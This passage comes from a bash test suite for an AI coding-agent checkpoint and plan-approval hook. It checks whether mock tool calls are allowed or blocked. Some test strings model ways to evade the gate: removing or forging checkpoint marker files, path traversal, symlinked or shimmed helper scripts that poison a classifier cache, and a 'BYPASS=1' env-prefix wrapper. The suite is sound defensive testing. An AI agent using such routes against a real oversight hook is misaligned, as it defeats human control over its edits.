  "$(mock_json_cwd 'Bash' "rm '/tmp/wrong/.checkpoints/.pre-checkpoint-done' \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")" \
  "/tmp/wrong/.checkpoints/.pre-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.pre-checkpoint-done"

# B-S8: regression — unquoted absolute non-canonical (no spaces) → still BLOCK
assert_blocked_with_reason "B-S8. Regression: unquoted absolute non-canonical (no spaces)" \
  "$(mock_json_cwd 'Bash' "rm /tmp/nospaces/.checkpoints/.plan-approval-pending" "$SPACE_DIR")" \
  "/tmp/nospaces/.checkpoints/.plan-approval-pending" \
  "$SPACE_DIR/.checkpoints/.plan-approval-pending"

# B-S9: caller process cwd ≠ JSON cwd; canonical-with-spaces target → allow + no leak
B_S9_JSON="$(mock_json_cwd 'Bash' "rm \"$SPACE_DIR/.checkpoints/.plan-approval-pending\"" "$SPACE_DIR")"
B_S9_OUT=$(echo "$B_S9_JSON" | run_hook_from_cwd "/tmp" 2>/dev/null)
if echo "$B_S9_OUT" | grep -qE 'non-canonical path|Relative marker reference'; then
  echo "  ✗ B-S9. Caller cwd=/tmp, JSON cwd=spacey (wrong-root falsely fired): $B_S9_OUT"
  ((failed++))
else
  echo "  ✓ B-S9. Caller cwd=/tmp, JSON cwd=spacey (no wrong-root block)"
  ((passed++))
fi
if [ -e "/tmp/.checkpoints" ]; then
  echo "  ✗ B-S9 (leak: /tmp/.checkpoints exists)"
  ((failed++))
else
  echo "  ✓ B-S9 (no caller-cwd leak)"
  ((passed++))
fi

# B-S10: linked worktree (both spacey, no-space marker in path) → allow
assert_no_wrong_root_block "B-S10. Linked worktree (spacey), main canonical marker" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR_WT")"

# B-S11: nested cwd under spacey repo → allow
assert_no_wrong_root_block "B-S11. Nested cwd under spacey repo" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR_NESTED")"

# B-S12: non-git JSON cwd, target=non-canonical with spaces → BLOCK
assert_blocked_with_reason "B-S12. Non-git JSON cwd, target non-canonical" \
  "$(mock_json_cwd 'Bash' "rm \"/tmp/no-repo/.checkpoints/.pre-checkpoint-done\"" "/tmp")" \
  "/tmp/no-repo/.checkpoints/.pre-checkpoint-done" \
  "/tmp/.checkpoints/.pre-checkpoint-done"

# B-S13: subprocess wrong-cwd inheritance — binds to JSON cwd, not process cwd
B_S13_JSON="$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")"
B_S13_OUT=$(echo "$B_S13_JSON" | run_hook_from_cwd "/tmp" 2>/dev/null)
if echo "$B_S13_OUT" | grep -qE 'non-canonical path|Relative marker reference'; then
  echo "  ✗ B-S13. Subprocess wrong-cwd inheritance (wrong-root falsely fired): $B_S13_OUT"
  ((failed++))
else
  echo "  ✓ B-S13. Subprocess wrong-cwd inheritance (binds to JSON cwd)"
  ((passed++))
fi

# B-S14: bash -c "touch /no-space/.checkpoints/.X" non-canonical → BLOCK (Pass B)
assert_blocked_with_reason "B-S14. bash -c non-canonical no-space" \
  "$(mock_json_cwd 'Bash' 'bash -c "touch /tmp/no-space/.checkpoints/.pre-checkpoint-done"' "$SPACE_DIR")" \
  "/tmp/no-space/.checkpoints/.pre-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.pre-checkpoint-done"

# B-S15: sh -c "rm /no-space/.checkpoints/.X" → BLOCK
assert_blocked_with_reason "B-S15. sh -c non-canonical no-space" \
  "$(mock_json_cwd 'Bash' 'sh -c "rm /tmp/other-non-canon/.checkpoints/.post-checkpoint-done"' "$SPACE_DIR")" \
  "/tmp/other-non-canon/.checkpoints/.post-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.post-checkpoint-done"

# B-S16: bash -c canonical (no-space cwd) → allow (Pass B canonical equality)
assert_no_wrong_root_block "B-S16. bash -c canonical no-space" \
  "$(mock_json_cwd 'Bash' "bash -c \"touch $CLEAN_DIR/.checkpoints/.pre-checkpoint-done\"" "$CLEAN_DIR")"

# B-S17: dd of="<canonical spacey>" → allow (Pass A')
assert_no_wrong_root_block "B-S17. dd of= canonical spacey" \
  "$(mock_json_cwd 'Bash' "dd if=/dev/null of=\"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")"

# B-S18: dd of="/tmp/wrong path/.X" non-canonical with spaces → BLOCK with full attempted
assert_blocked_with_reason "B-S18. dd of= non-canonical spacey" \
  "$(mock_json_cwd 'Bash' "dd if=/dev/null of=\"/tmp/wrong path/.checkpoints/.pre-checkpoint-done\"" "$SPACE_DIR")" \
  "/tmp/wrong path/.checkpoints/.pre-checkpoint-done" \
  "$SPACE_DIR/.checkpoints/.pre-checkpoint-done"

# B-S19: --output= non-canonical spacey → BLOCK
assert_blocked_with_reason "B-S19. --output= non-canonical spacey" \
  "$(mock_json_cwd 'Bash' "tool --output=\"/sp path/.checkpoints/.plan-approval-pending\"" "$SPACE_DIR")" \
  "/sp path/.checkpoints/.plan-approval-pending" \
  "$SPACE_DIR/.checkpoints/.plan-approval-pending"

# B-S20: --output= canonical spacey → allow
assert_no_wrong_root_block "B-S20. --output= canonical spacey" \
  "$(mock_json_cwd 'Bash' "tool --output=\"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")"

# B-S21: P2 relative-token disambiguation inside bash -c payload from main cwd
assert_no_wrong_root_block "B-S21. P2 relative-token disambiguation" \
  "$(mock_json_cwd 'Bash' "bash -c \"echo ./tmp/.checkpoints/.pre-checkpoint-done >/dev/null\"" "$SPACE_DIR")"

# B-S22: P1 canonical short-circuit (whole-token Pass A) — verifies that
# Pass B does NOT then false-positive on the same token by truncating spaces.
assert_no_wrong_root_block "B-S22. P1 canonical short-circuit Pass A" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.plan-approval-pending\"" "$SPACE_DIR")"

# B-S23: P1 canonical short-circuit (Pass A' key=path) — same invariant
assert_no_wrong_root_block "B-S23. P1 canonical short-circuit Pass A'" \
  "$(mock_json_cwd 'Bash' "dd if=/dev/null of=\"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR")"

# B-S24: main repo spacey + linked worktree spacey; write MAIN canonical → allow
assert_no_wrong_root_block "B-S24. Worktree spacey, MAIN canonical target" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR_WT")"

# B-S25: write WORKTREE-LOCAL absolute marker → BLOCK with full attempted+canonical
assert_blocked_with_reason "B-S25. Worktree spacey, WORKTREE-LOCAL target" \
  "$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR_WT/.checkpoints/.checkpoint-required\"" "$SPACE_DIR_WT")" \
  "$SPACE_DIR_WT/.checkpoints/.checkpoint-required" \
  "$SPACE_DIR/.checkpoints/.checkpoint-required"

# B-S26: paired target + caller disk assertion
B_S26_CALLER_CWD="$(mktemp -d "${TMPDIR:-/tmp}/em-caller.XXXXXX")"
B_S26_CALLER_CWD="$(cd -P "$B_S26_CALLER_CWD" && pwd)"
B_S26_JSON="$(mock_json_cwd 'Bash' "touch \"$SPACE_DIR/.checkpoints/.checkpoint-required\"" "$SPACE_DIR_WT")"
B_S26_OUT=$(echo "$B_S26_JSON" | run_hook_from_cwd "$B_S26_CALLER_CWD" 2>/dev/null)
if echo "$B_S26_OUT" | grep -qE 'non-canonical path|Relative marker reference'; then
  echo "  ✗ B-S26. Disk-paired allow (wrong-root falsely fired): $B_S26_OUT"
  ((failed++))
else
  echo "  ✓ B-S26. Disk-paired allow (no wrong-root block from caller cwd)"
  ((passed++))
fi
assert_disk_artifacts "B-S26. Paired disk artifacts" \
  "$SPACE_DIR/.checkpoints/.checkpoint-required" \
  "$B_S26_CALLER_CWD"
rm -rf "$B_S26_CALLER_CWD"

# ---- B-S cleanup ----
git -C "$SPACE_DIR" worktree remove --force "$SPACE_DIR_WT" 2>/dev/null
git -C "$SPACE_DIR" branch -D test-spacey-wt-branch 2>/dev/null
rm -rf "$SPACE_DIR" "$CLEAN_DIR"

# ============================================================================
echo ""
echo "--- Result ---"
# ============================================================================
# ============================================================================
echo ""
echo "--- Smart-arming (off-repo Edit/Write allow, codex R1-R6 consensus) ---"
# ============================================================================
# PR fix/checkpoint-gate-smart-arming. Stops checkpoint-gate from firing on
# off-repo Edit/Write/MultiEdit/NotebookEdit while preserving Rule 18
# enforcement for in-repo edits. Bash side stays strict (codex R1 6b).

# Helper: emit mock JSON for Edit/Write with explicit file_path and optional
# cwd variations. Existing mock_json hardcodes .cwd=TEST_DIR — for cwd-binding
# tests we need cwd permutations.
mock_path_json() {
  local tool_name="$1" file_path="$2" top_cwd="${3:-$TEST_DIR}" ti_cwd="${4:-}"
  if [ -n "$ti_cwd" ]; then
    jq -n --arg tn "$tool_name" --arg fp "$file_path" --arg c "$top_cwd" --arg tic "$ti_cwd" \
      '{tool_name: $tn, tool_input: {file_path: $fp, cwd: $tic}, cwd: $c}'
  else
    jq -n --arg tn "$tool_name" --arg fp "$file_path" --arg c "$top_cwd" \
      '{tool_name: $tn, tool_input: {file_path: $fp}, cwd: $c}'
  fi
}

# Smart-arming test scratch dirs (off-repo paths that mimic the user's
# real-world ~/.claude/projects/** and ~/.claude/skills/** layout).
OFFREPO_DIR="$(mktemp -d)"
OFFREPO_DIR="$(cd -P "$OFFREPO_DIR" && pwd)"

reset_state
touch "$PRE_REQ"  # arm — pre-block fires unless predicate allows

# ── In-repo edits still block ──
assert_blocked "SA-1. Edit IN-REPO existing file BLOCKED (smart-arming preserves Rule 18)" \
  "$(mock_path_json 'Edit' "$TEST_DIR/scripts-test.mjs")" "Checkpoint required"
assert_blocked "SA-2. Write IN-REPO NONEXISTENT new file BLOCKED (R2/P1 nonexistent-path)" \
  "$(mock_path_json 'Write' "$TEST_DIR/new-scripts/new.mjs")" "Checkpoint required"
assert_blocked "SA-3. Write IN-REPO deep nonexistent ancestor chain BLOCKED" \
  "$(mock_path_json 'Write' "$TEST_DIR/new-dir/sub/deep.mjs")" "Checkpoint required"
assert_blocked "SA-4. MultiEdit IN-REPO file BLOCKED (single file_path, R1/P2 shape)" \
  "$(mock_path_json 'MultiEdit' "$TEST_DIR/existing.txt")" "Checkpoint required"

# ── Off-repo edits now allowed ──
assert_allowed "SA-5. Edit OFF-REPO memory-style path allowed (.claude/projects)" \
  "$(mock_path_json 'Edit' "$OFFREPO_DIR/memory/foo.md")"
assert_allowed "SA-6. Write OFF-REPO skill-style path allowed (.claude/skills)" \
  "$(mock_path_json 'Write' "$OFFREPO_DIR/skills/foo/SKILL.md")"
assert_allowed "SA-7. Edit OFF-REPO settings-style path allowed (.claude/settings.local.json)" \
  "$(mock_path_json 'Edit' "$OFFREPO_DIR/settings.local.json")"
assert_allowed "SA-8. MultiEdit OFF-REPO single file allowed" \
  "$(mock_path_json 'MultiEdit' "$OFFREPO_DIR/memory/bar.md")"
assert_allowed "SA-9. NotebookEdit OFF-REPO ipynb allowed (uses notebook_path field per F1 fix)" \
  "$(jq -n --arg tn 'NotebookEdit' --arg np "$OFFREPO_DIR/notebook.ipynb" --arg c "$TEST_DIR" \
    '{tool_name: $tn, tool_input: {notebook_path: $np}, cwd: $c}')"
assert_blocked "SA-9b. NotebookEdit IN-REPO ipynb BLOCKED (notebook_path field reaches predicate)" \
  "$(jq -n --arg tn 'NotebookEdit' --arg np "$TEST_DIR/in-repo.ipynb" --arg c "$TEST_DIR" \
    '{tool_name: $tn, tool_input: {notebook_path: $np}, cwd: $c}')" "Checkpoint required"

# ── Path-traversal attack: traversal that lands back in repo blocks ──
TRAVERSAL_PATH="$TEST_DIR/../$(basename "$TEST_DIR")/traversal.mjs"
assert_blocked "SA-10. Edit via traversal back into repo BLOCKED (canonicalize handles)" \
  "$(mock_path_json 'Edit' "$TRAVERSAL_PATH")" "Checkpoint required"

# ── Symlink axis tests (codex R1-R6 driven) ──
# Axis 2 (R2/P1): external symlink FILE → existing repo file
echo "in-repo content" > "$TEST_DIR/existing.txt"
SYM_FILE_TO_REPO="$OFFREPO_DIR/link-to-repo-file"
ln -sf "$TEST_DIR/existing.txt" "$SYM_FILE_TO_REPO"
assert_blocked "SA-sym2. External symlink FILE → existing repo file BLOCKED (axis 2)" \
  "$(mock_path_json 'Edit' "$SYM_FILE_TO_REPO")" "Checkpoint required"

# Axis 3: external symlink DIR → existing repo child
mkdir -p "$TEST_DIR/scripts-test-dir"
echo "child content" > "$TEST_DIR/scripts-test-dir/child.mjs"
SYM_DIR_TO_REPO="$OFFREPO_DIR/link-to-repo-dir"
ln -sfn "$TEST_DIR/scripts-test-dir" "$SYM_DIR_TO_REPO"
assert_blocked "SA-sym3. External symlink DIR → existing repo child BLOCKED (axis 3)" \
  "$(mock_path_json 'Edit' "$SYM_DIR_TO_REPO/child.mjs")" "Checkpoint required"

# Axis 1 (R3/P1): external BROKEN symlink → nonexistent repo target
SYM_BROKEN_TO_REPO="$OFFREPO_DIR/broken-link-to-repo"
ln -sf "$TEST_DIR/nonexistent-future.mjs" "$SYM_BROKEN_TO_REPO"
assert_blocked "SA-sym1. External broken symlink → nonexistent repo target BLOCKED (axis 1, R3/P1)" \
  "$(mock_path_json 'Edit' "$SYM_BROKEN_TO_REPO")" "Checkpoint required"

# Axis 4: internal symlink → outside repo (symlink-out, raw-path-prefix match)
SYM_REPO_OUT="$TEST_DIR/link-pointing-out.mjs"
ln -sf "$OFFREPO_DIR/external-target.mjs" "$SYM_REPO_OUT"
assert_blocked "SA-sym4. Internal symlink-out: raw repo path BLOCKED (author intent, axis 4)" \
  "$(mock_path_json 'Edit' "$SYM_REPO_OUT")" "Checkpoint required"

# Axis 5: symlinked ancestor → outside repo with nonexistent leaf → ALLOW
# (codex R3: "Allow is correct if smart-arming is based on actual artifact
# location. A raw path under repo that resolves through a symlinked ancestor
# to outside the repo should not arm repo-source checkpoint state." — but
# raw-prefix match catches this first because the path starts with TEST_DIR.
# So actually for this axis to allow, the path must NOT start with raw repo
# root literally. The axis applies when caller types something that resolves
# out via a symlinked ancestor. We construct such a path explicitly.)
mkdir -p "$TEST_DIR/external-target-dir"
SYM_REPO_LINK_DIR="$TEST_DIR/link-dir-to-external"
ln -sfn "$OFFREPO_DIR/external-target-dir" "$SYM_REPO_LINK_DIR"
# This still starts with $TEST_DIR/ so raw-prefix matches → block. Document
# that axis 5 with raw-path-under-repo is dominated by raw-prefix block,
# which is the SAFE direction (block on author intent). Test it:
assert_blocked "SA-sym5. Repo-relative path through symlinked ancestor BLOCKED (raw-prefix wins)" \
  "$(mock_path_json 'Edit' "$SYM_REPO_LINK_DIR/foo.mjs")" "Checkpoint required"

# ── Cwd-binding tests (R4/P1 + R5 fallback) ──
# T_cwd1: relative FILE_PATH + absolute tool_input.cwd → resolved + block
assert_blocked "SA-cwd1. Relative FILE_PATH + absolute tool_input.cwd → resolved + block" \
  "$(mock_path_json 'Edit' 'scripts-test.mjs' "$TEST_DIR" "$TEST_DIR")" "Checkpoint required"

# T_cwd2: relative FILE_PATH + empty tool_input.cwd + absolute top-level .cwd → resolved + block
assert_blocked "SA-cwd2. Relative FILE_PATH + absolute top-level .cwd → resolved + block" \
  "$(mock_path_json 'Edit' 'scripts-test.mjs' "$TEST_DIR" "")" "Checkpoint required"

# T_cwd3: relative FILE_PATH + RELATIVE .cwd + RELATIVE tool_input.cwd → BLOCK
#
# planapproval redesign (2026-05-27): relative cwds give no absolute authority,
# so FILE_PATH resolves to "" (empty path). With NO approved-plan token and
# nothing armed, this is PLANNING → allowed, and never arms (the empty-FILE_PATH
# branch never writes a marker, so no leak at the fallback hook-pwd root either).
# The "empty path + sanctioned implementation → block" half is covered by 4b
# (approval token) and the armed-checkpoint tests.
#
# (Pre-planapproval this asserted a conservative block via the lazy-arm
# heuristic; the redesign anchors the gate to plan-approval, so an unapproved
# empty-path edit is planning and passes.)
assert_allowed "SA-cwd3. Relative FILE_PATH + relative cwds → empty path, no approval → allowed (planning)" \
  "$(jq -n --arg tn 'Edit' --arg fp 'scripts-test.mjs' --arg c './relative' --arg tic './relative-dir' \
    '{tool_name: $tn, tool_input: {file_path: $fp, cwd: $tic}, cwd: $c}')"

# T_cwd3-strict: caller cwd != target with empty cwd. Run hook from a separate
# temp caller cwd; empty top-level .cwd falls back to hook process pwd =
# CALLER_TMP. FILE_PATH 'scripts/x.mjs' is relative with no absolute authority
# → resolves to "" → empty path.
#
# CRITICAL invariant (lazy-arm leak regression): the empty-FILE_PATH branch must
# NEVER write a marker. Under the planapproval redesign it never arms at all
# (arming requires a concrete FILE_PATH AND an approved-plan token). With NO
# approval here, the edit is PLANNING → allowed (exit 0), and zero marker
# artifacts appear under CALLER_TMP. Assert allow + no caller-marker leak.
CALLER_TMP="$(mktemp -d)"
CALLER_TMP="$(cd -P "$CALLER_TMP" && pwd)"
SA_CWD_STRICT_JSON="$(jq -n --arg tn 'Edit' --arg fp 'scripts/x.mjs' \
  '{tool_name: $tn, tool_input: {file_path: $fp}, cwd: ""}')"
SA_CWD_STRICT_OUT="$(cd "$CALLER_TMP" && echo "$SA_CWD_STRICT_JSON" | HOME="$TEST_HOME" bash "$HOOK" 2>/dev/null)"
SA_CWD_STRICT_EXIT=$?
if [ $SA_CWD_STRICT_EXIT -eq 0 ] && [ -z "$SA_CWD_STRICT_OUT" ] \
   && [ ! -e "$CALLER_TMP/.checkpoints" ] && [ ! -e "$CALLER_TMP/.claude" ]; then
  echo "  ✓ SA-cwd-strict. Caller cwd != target + empty cwd, no approval → allowed (planning) + NO caller marker leak"
  ((passed++))
else
  echo "  ✗ SA-cwd-strict. exit=$SA_CWD_STRICT_EXIT out=$SA_CWD_STRICT_OUT caller_leak=$([ -e "$CALLER_TMP/.checkpoints" ] || [ -e "$CALLER_TMP/.claude" ] && echo yes || echo no)"
  ((failed++))
fi
rm -rf "$CALLER_TMP"

# T_cwd5: absolute FILE_PATH → no-op fallback → normal predicate behavior (in-repo absolute → block)
assert_blocked "SA-cwd5. Absolute in-repo FILE_PATH → normal predicate (regression-only)" \
  "$(mock_path_json 'Edit' "$TEST_DIR/foo.mjs")" "Checkpoint required"

# ── Artifact-location check (codex R6 R7 ACCEPT criteria) ──
# When smart-arming allows off-repo Edit, confirm NO pre-checkpoint marker
# was written under TEST_DIR. The off-repo allow path returns silently and
# does NOT touch markers. (Note: the hook itself doesn't write markers in
# the off-repo case; only the agent's own Write/Edit follow-up does. We
# verify the hook's null side-effect.)
reset_state
touch "$PRE_REQ"
# GNU-first stat: on Linux `stat -f %m` does NOT fail — GNU -f prints a
# multi-line FILESYSTEM status block (including free-block counts that change
# on any unrelated disk write), so the BSD-first order compared filesystem
# snapshots, not mtimes. It was accidentally stable until E5 telemetry wrote
# gate-log.jsonl between the two captures. `stat -c %Y` errors cleanly on BSD,
# so GNU-first is the safe order.
PRE_REQ_MTIME_BEFORE="$(stat -c %Y "$PRE_REQ" 2>/dev/null || stat -f %m "$PRE_REQ" 2>/dev/null)"
echo "$(mock_path_json 'Edit' "$OFFREPO_DIR/memory/x.md")" | run_hook >/dev/null 2>&1
PRE_REQ_MTIME_AFTER="$(stat -c %Y "$PRE_REQ" 2>/dev/null || stat -f %m "$PRE_REQ" 2>/dev/null)"
if [ "$PRE_REQ_MTIME_BEFORE" = "$PRE_REQ_MTIME_AFTER" ] \
   && [ ! -e "$PRE_DONE" ] && [ ! -e "$POST_REQ" ] && [ ! -e "$POST_DONE" ]; then
  echo "  ✓ SA-disk. Off-repo Edit while armed: no marker artifacts touched (R6 R7 criterion)"
  ((passed++))
else
  echo "  ✗ SA-disk. Off-repo Edit while armed: marker artifacts changed unexpectedly"
  echo "     mtime_before=$PRE_REQ_MTIME_BEFORE mtime_after=$PRE_REQ_MTIME_AFTER pre_done=$([ -e "$PRE_DONE" ] && echo EXISTS || echo no) post_req=$([ -e "$POST_REQ" ] && echo EXISTS || echo no) post_done=$([ -e "$POST_DONE" ] && echo EXISTS || echo no)"
  echo "     .checkpoints listing: $(ls -a "$TEST_DIR/.checkpoints" 2>/dev/null | tr '\n' ' ')"
  ((failed++))
fi

# Cleanup off-repo scratch.
rm -rf "$OFFREPO_DIR"

# ============================================================================
echo ""
echo "--- PR-A P1.2: classifier-marker bootstrap carve-out under armed checkpoint ---"
# ============================================================================
# Codex R1 plan-tier P1: classifier-marker.mjs invocations were blocked when
# .checkpoint-required is armed (empty TARGET → fell through marker_write
# branch → pre-gate blocked). With the carve-out, valid classifier-marker
# invocations exit 0.
#
# Planning-passive redesign (2026-05-25): the pre-gate no longer gates Bash, so
# shimmed/relative/bare forms — which fail the carve-out's helper-identity
# validation and fall through — are now ALLOWED (F1 residual: arbitrary
# `node <script>` is just shared_write Bash and was always going to run under the
# freed-Bash design). The validator (_validate_classifier_marker_helper) still
# rejects them, but its rejection is no longer observable as a block.
# EXCEPTION: env-prefixed forms (NC-6) are still BLOCKED directly — env-prefix
# wrapper escape is rejected as a FORM (codex review FU), independent of pre-gating.
# Other observable boundaries: plan-pending still blocks even shimmed forms
# (NC-9), and the canonical allow-path still works (NC-1/2/7).

# Set up canonical helper locations the validator accepts.
GLOBAL_HELPER_DIR="$TEST_HOME/.episodic-memory/scripts"
mkdir -p "$GLOBAL_HELPER_DIR"
touch "$GLOBAL_HELPER_DIR/classifier-marker.mjs"
GLOBAL_HELPER="$GLOBAL_HELPER_DIR/classifier-marker.mjs"

REPO_HELPER_DIR="$TEST_DIR/scripts"
mkdir -p "$REPO_HELPER_DIR"
touch "$REPO_HELPER_DIR/classifier-marker.mjs"
REPO_HELPER="$REPO_HELPER_DIR/classifier-marker.mjs"

SHIMMED_HELPER_DIR="$(mktemp -d)"
SHIMMED_HELPER_DIR="$(cd -P "$SHIMMED_HELPER_DIR" && pwd)"
touch "$SHIMMED_HELPER_DIR/classifier-marker.mjs"
SHIMMED_HELPER="$SHIMMED_HELPER_DIR/classifier-marker.mjs"

reset_state
touch "$PRE_REQ"  # arm — pre-gate would block any non-allowed write

# ── Valid global helper path → allowed (key fix) ──
assert_allowed "NC-1. node ~/.episodic-memory/scripts/classifier-marker.mjs --write allowed under armed .checkpoint-required" \
  "$(mock_json 'Bash' "node $GLOBAL_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Valid repo-source helper path → allowed ──
assert_allowed "NC-2. node <repo>/scripts/classifier-marker.mjs --write allowed (repo-source path parity)" \
  "$(mock_json 'Bash' "node $REPO_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Shimmed binary at /tmp → now ALLOWED (Bash ungated; validator still rejects
#    but rejection is unobservable as a block) ──
assert_allowed "NC-3. Shimmed binary (node /tmp/.../classifier-marker.mjs) now allowed (Bash ungated, F1 residual)" \
  "$(mock_json 'Bash' "node $SHIMMED_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Relative path (./classifier-marker.mjs) → now ALLOWED (Bash ungated) ──
assert_allowed "NC-4. Relative ./classifier-marker.mjs path now allowed (Bash ungated)" \
  "$(mock_json 'Bash' "node ./classifier-marker.mjs --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Bare basename → now ALLOWED (Bash ungated) ──
assert_allowed "NC-5. Bare 'classifier-marker.mjs' (no path) now allowed (Bash ungated)" \
  "$(mock_json 'Bash' "node classifier-marker.mjs --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Env-prefix attempt → BLOCKED directly (codex review FU). The classifier
#    flags it unsafe_complex/classifier_marker_env_override; the gate blocks the
#    FORM regardless of Bash pre-gating, so the planning-passive Bash allowance
#    can't bless an env-prefix wrapper escape against the classifier cache. ──
assert_blocked "NC-6. Env-prefix BYPASS=1 form BLOCKED (env-prefix wrapper escape, independent of pre-gate)" \
  "$(mock_json 'Bash' "BYPASS=1 node $GLOBAL_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")" \
  "Env-prefix wrapper escape"

# ── Symlink to allowed location → allowed (canonicalization resolves) ──
SYMLINK_HELPER_DIR="$(mktemp -d)"
SYMLINK_HELPER_DIR="$(cd -P "$SYMLINK_HELPER_DIR" && pwd)"
SYMLINK_HELPER="$SYMLINK_HELPER_DIR/classifier-marker.mjs"
ln -sf "$GLOBAL_HELPER" "$SYMLINK_HELPER"
assert_allowed "NC-7. Symlink → allowed canonical path allowed (canonicalize follows symlink)" \
  "$(mock_json 'Bash' "node $SYMLINK_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")"

# ── Symlink to shimmed location → now BLOCKED (PR-B2 #351). The shim's basename
#    is classifier-marker-evil.mjs, so it does NOT match the classifier-marker.mjs
#    case-arm → interpreter_other → shared_write → the Bash arm fires. F1 closure
#    is a security improvement here: the shim command can no longer RUN to poison
#    the cache (it was allowed under the F1 residual). ──
SYMLINK_TO_EVIL="$SYMLINK_HELPER_DIR/classifier-marker-evil.mjs"
ln -sf "$SHIMMED_HELPER" "$SYMLINK_TO_EVIL"
assert_blocked "NC-8. Symlink → shimmed binary held for classification + blocks (F1 closed)" \
  "$(mock_json 'Bash' "node $SYMLINK_TO_EVIL --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")" \
  "Classify it ONCE"

# ── Plan-pending invariant preserved: classifier-marker BLOCKED while plan-pending ──
# (Even with carve-out, plan-pending check fires earlier and blocks marker_write.)
reset_state
touch "$MARKER_DIR/.plan-approval-pending"
assert_blocked "NC-9. classifier-marker BLOCKED while .plan-approval-pending exists (plan-pending invariant > bootstrap carve-out)" \
  "$(mock_json 'Bash' "node $GLOBAL_HELPER --write --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc --label read_only --confidence 0.9 --reason test")" \
  "Plan approval pending"

# ── Read-only mode (no --write flag) also covered by carve-out ──
reset_state
touch "$PRE_REQ"
assert_allowed "NC-10. classifier-marker --read (no --write) also allowed under armed checkpoint" \
  "$(mock_json 'Bash' "node $GLOBAL_HELPER --read --project-root $TEST_DIR --caller-cwd $TEST_DIR --command 'foo' --session-id abc")"

# Cleanup
rm -rf "$SHIMMED_HELPER_DIR" "$SYMLINK_HELPER_DIR"

# ============================================================================
echo ""
echo "--- PR-A P1.1: authority-root threading (caller_cwd != hook \$PWD) ---"
# ============================================================================
# Codex R1 plan-tier P1: command-classifier.sh:1762 passed \$PWD as caller_cwd
# into llm_classify_command instead of the parsed JSON .cwd. Marker written
# under nested cwd was a miss when classify_command subprocess \$PWD diverged
# from the .cwd authority. Fix: thread parsed .cwd through classify_command +
# _classify_segment to both Tier 0 (line 1547) and Tier 2/3 (line 1762).

# Skip if the real classifier-marker.mjs isn't reachable from this repo
# (e.g., extracted fixture). The integration test needs the real helper.
# Resolve from $REPO_ROOT (depth-independent) rather than $HOOK-relative
# arithmetic, which would silently break on any future hooks/ relocation
# (RFC-008 P1a moved hooks/ → plugins/claude-code/hooks/, 2 levels deeper).
REAL_HELPER="$REPO_ROOT/scripts/classifier-marker.mjs"
if [ -f "$REAL_HELPER" ]; then
  P11_REPO="$(mktemp -d)"
  P11_REPO="$(cd -P "$P11_REPO" && pwd)"
  git -C "$P11_REPO" init -q 2>/dev/null
  P11_REPO_MARKER_DIR="$P11_REPO/.checkpoints"
  P11_REPO_PRE_REQ="$P11_REPO_MARKER_DIR/.checkpoint-required"
  P11_REPO_PRE_DONE="$P11_REPO_MARKER_DIR/.pre-checkpoint-done"
  mkdir -p "$P11_REPO_MARKER_DIR"

  # Fresh per-test home so classifier-cache.json starts clean.
  P11_HOME="$(mktemp -d)"
  P11_HOME="$(cd -P "$P11_HOME" && pwd)"

  # Pre-classify a novel `node /tmp/p11-novel.mjs --inspect` command as
  # read_only, with caller_cwd = repo root. Need a session id (matches
  # CLAUDE_CODE_SESSION_ID env semantics).
  P11_SID="$(uuidgen 2>/dev/null || echo "p11-test-session-$$")"
  P11_CMD="node /tmp/p11-novel.mjs --inspect"

  # Helper requires process.cwd() == --project-root (§M6) and env
  # CLAUDE_CODE_SESSION_ID == --session-id (§M4) for honest single-session
  # write. Drop helper diagnostics to stderr-only so the test stays quiet.
  P11_WRITE_OUT="$( (cd "$P11_REPO" && CLAUDE_CODE_SESSION_ID="$P11_SID" node "$REAL_HELPER" --write \
    --project-root "$P11_REPO" \
    --caller-cwd "$P11_REPO" \
    --command "$P11_CMD" \
    --session-id "$P11_SID" \
    --label read_only \
    --confidence 0.95 \
    --reason "P1.1 integration test") 2>&1 )"

  # Marker exists?
  if ls "$P11_REPO_MARKER_DIR/classify/"*.json >/dev/null 2>&1; then
    # Arm pre-checkpoint to prove the marker-hit path is allowed under the
    # exact condition (.checkpoint-required armed) that codex R1 P1 reported.
    # Without P1.1 threading, marker would miss (hook $PWD != caller_cwd),
    # classifier would fall through to interpreter_other shared_write, the
    # pre-gate would block on missing pre-checkpoint marker.
    touch "$P11_REPO_PRE_REQ"

    # Invoke the hook with cwd=$P11_REPO (.cwd authority) but hook process
    # pwd != P11_REPO (i.e., simulate launchd / cross-cwd dispatch). Use
